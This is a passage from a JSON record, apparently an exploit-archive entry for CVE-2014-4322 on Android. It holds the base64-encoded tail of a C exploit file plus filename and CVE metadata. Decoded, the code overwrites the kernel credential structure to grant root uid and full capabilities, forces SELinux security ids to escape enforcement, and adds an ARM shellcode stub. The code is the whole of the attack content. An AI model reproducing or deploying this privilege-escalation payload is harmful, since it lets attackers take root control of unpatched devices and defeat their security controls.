QogICAgICAgIG15X3JlYWxfY3JlZC0+ZXVpZCA9IDA7DQogICAgICAgIG15X3JlYWxfY3JlZC0+ZnNnaWQgPSAwOw0KICAgICAgICBteV9yZWFsX2NyZWQtPmZzdWlkID0gMDsNCiAgICAgICAgbXlfcmVhbF9jcmVkLT5zZWN1cmViaXRzPTA7DQogICAgICAgIG15X3JlYWxfY3JlZC0+Y2FwX2JzZXQuY2FwWzBdID0gLTE7DQogICAgICAgIG15X3JlYWxfY3JlZC0+Y2FwX2JzZXQuY2FwWzFdID0gLTE7DQogICAgICAgIG15X3JlYWxfY3JlZC0+Y2FwX2luaGVyaXRhYmxlLmNhcFswXSA9IC0xOw0KICAgICAgICBteV9yZWFsX2NyZWQtPmNhcF9pbmhlcml0YWJsZS5jYXBbMV0gPSAtMTsNCiAgICAgICAgbXlfcmVhbF9jcmVkLT5jYXBfcGVybWl0dGVkLmNhcFswXSA9IC0xOw0KICAgICAgICBteV9yZWFsX2NyZWQtPmNhcF9wZXJtaXR0ZWQuY2FwWzFdID0gLTE7DQogICAgICAgIG15X3JlYWxfY3JlZC0+Y2FwX2VmZmVjdGl2ZS5jYXBbMF0gPSAtMTsNCiAgICAgICAgbXlfcmVhbF9jcmVkLT5jYXBfZWZmZWN0aXZlLmNhcFsxXSA9IC0xOw0KDQoNCiAgICAgICAgaWYoaXNTZWxpbnV4KXsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgdHNlYyA9IG15X2NyZWQtPnNlY3VyaXR5Ow0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZih0c2VjICYmIHRzZWMgPiAweEJGRkZGRkZGKXsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0c2VjLT5zaWQgPSAxOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRzZWMtPmV4ZWNfc2lkID0gMTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldCA9IDE1Ow0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHNlYyA9IChzdHJ1Y3QgdGFza19zZWN1cml0eV9zdHJ1Y3QqKSgqKGludCopKDB4MTAgKyAgKGludCkmbXlfY3JlZC0+c2VjdXJpdHkpKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHRzZWMgJiYgdHNlYyA+IDB4QkZGRkZGRkYpew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRzZWMtPnNpZCA9IDE7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHNlYy0+ZXhlY19zaWQgPSAxOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0ID0gMTU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCg0KICAgICAgICAgICAgICAgICAgICAgICAgdHNlYyA9IG15X3JlYWxfY3JlZC0+c2VjdXJpdHk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKHRzZWMgJiYgdHNlYyA+IDB4QkZGRkZGRkYpew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRzZWMtPnNpZCA9IDE7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHNlYy0+ZXhlY19zaWQgPSAxOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0ID0gMTU7DQogICAgICAgICAgICAgICAgICAgICAgICB9ZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHNlYyA9IChzdHJ1Y3QgdGFza19zZWN1cml0eV9zdHJ1Y3QqKSgqKGludCopKDB4MTAgKyAgKGludCkmbXlfcmVhbF9jcmVkLT5zZWN1cml0eSkpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYodHNlYyAmJiB0c2VjID4gMHhCRkZGRkZGRil7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHNlYy0+c2lkID0gMTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0c2VjLT5leGVjX3NpZCA9IDE7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXQgPSAxNTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KDQoNCiAgICAgICAgfQ0KICAgICAgICBlbHNlew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0ID0gMTY7DQogICAgICAgIH0NCiAgICAgICAgcHJpbnRrKCJyZXR1cm4gJWQiLHJldCk7DQogICAgICAgIHJldHVybiByZXQ7DQp9DQovLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09bXNtLmMgICBlbmQ9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCi8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1zaGVsbGNvZGUuUyAgIHN0YXJ0PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojZGVmaW5lIF9fQVNTRU1CTFlfXw0KI2luY2x1ZGUgIDxsaW51eC9saW5rYWdlLmg+DQoNCi5leHRlcm4gc2F5aGVsbG8NCg0KDQpFTlRSWShzaGVsbF9jb2RlMikNCiAgICAgICAgICAgICAgICAgICAgICBsZHIgcjAsIFtwYyAsICM0XQ0KICAgICAgICAgICAgICAgICAgICAgIFNUTUZEICBTUCEsIHtSMH0NCiAgICAgICAgICAgICAgICAgICAgICBMRE1GRCAgIFNQISwge1BDfQ0KIC5ieXRlIDB4ZWUsIDB4ZWUsIDB4ZWUsIDB4ZWUNCi8vPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1zaGVsbGNvZGUuUyAgIGVuZD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==", 
    "filename": "platforms/android/local/35711.c", 
    "id": "35711", 
    "cves": [
        "CVE-2014-4322"
    ]
}